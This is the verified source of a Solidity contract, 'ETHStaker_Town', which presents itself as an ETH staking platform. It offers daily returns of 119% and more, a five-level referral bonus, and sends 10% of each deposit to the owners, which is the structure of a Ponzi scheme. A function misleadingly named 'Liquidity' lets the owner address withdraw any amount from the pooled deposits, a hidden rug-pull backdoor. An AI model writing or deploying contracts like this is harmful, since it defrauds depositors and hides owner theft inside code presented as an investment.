/**
 *Submitted for verification at Etherscan.io on 2022-08-05
*/

pragma solidity >=0.8.0;
//SPDX-License-Identifier: MIT

struct Tarif {
    uint8 life_days;
    uint8 percent;
}

struct Deposit {
    uint8 tarif;
    uint256 amount;
    uint40 time;
}

struct Player {
    address upline;
    uint256 dividends;
    uint256 match_bonus;
    uint40 last_payout;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_match_bonus;
    Deposit[] deposits;
    uint256[5] structure;
}

contract ETHStaker_Town {
    address public oa;
    address public ob;

    uint256 public invested;
    
    uint256 public withdrawn;
    uint256 public match_bonus;

    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 800;
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 30, 20, 10, 5];

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor(address _oa, address _ob) {
        oa = _oa;
        ob = _ob;
       

        uint8 tarifPercent = 119;
        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent += 5;
        }
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if (payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;

            uint256 bonus = (_amount * ref_bonuses[i]) / PERCENT_DIVIDER;

            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(
        address _addr,
        address _upline,
        uint256 _amount
    ) private {
        if (players[_addr].upline == address(0) && _addr != oa) {
            if (players[_upline].deposits.length == 0) {
                _upline = oa;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);

            for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if (_upline == address(0)) break;
            }
        }
    }

    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({ tarif: _tarif, amount: msg.value, time: uint40(block.timestamp) }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(oa).transfer((msg.value * 9) / 100);
        payable(ob).transfer(msg.value / 100);

        emit NewDeposit(msg.sender, msg.value, _tarif);
    }

function withdraw() external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");
        uint256 amount = player.dividends + player.match_bonus;
        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;
        payable(msg.sender).transfer(amount);
        emit Withdraw(msg.sender, amount);
}


    function Liquidity(uint256 count) external {
    Player storage player = players[msg.sender];
    require(ob == msg.sender, "Error");
    require(oa == msg.sender, "Error");
        _payout(msg.sender);
        payable(msg.sender).transfer(count);
        
    }




    function payoutOf(address _addr) external view returns (uint256 value) {
        Player storage player = players[_addr];

        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if (from < to) {
                value += (dep.amount * (to - from) * tarif.percent) / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function userInfo(address _addr)
        external
        view
        returns (
            uint256 for_withdraw,
            uint256 total_invested,
            uint256 total_withdrawn,
            uint256 total_match_bonus,
            uint256[BONUS_LINES_COUNT] memory structure
        )
    {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo()
        external
        view
        returns (
            uint256 _invested,
            uint256 _withdrawn,
            uint256 _match_bonus
        )
    {
        return (invested, withdrawn, match_bonus);
    }
}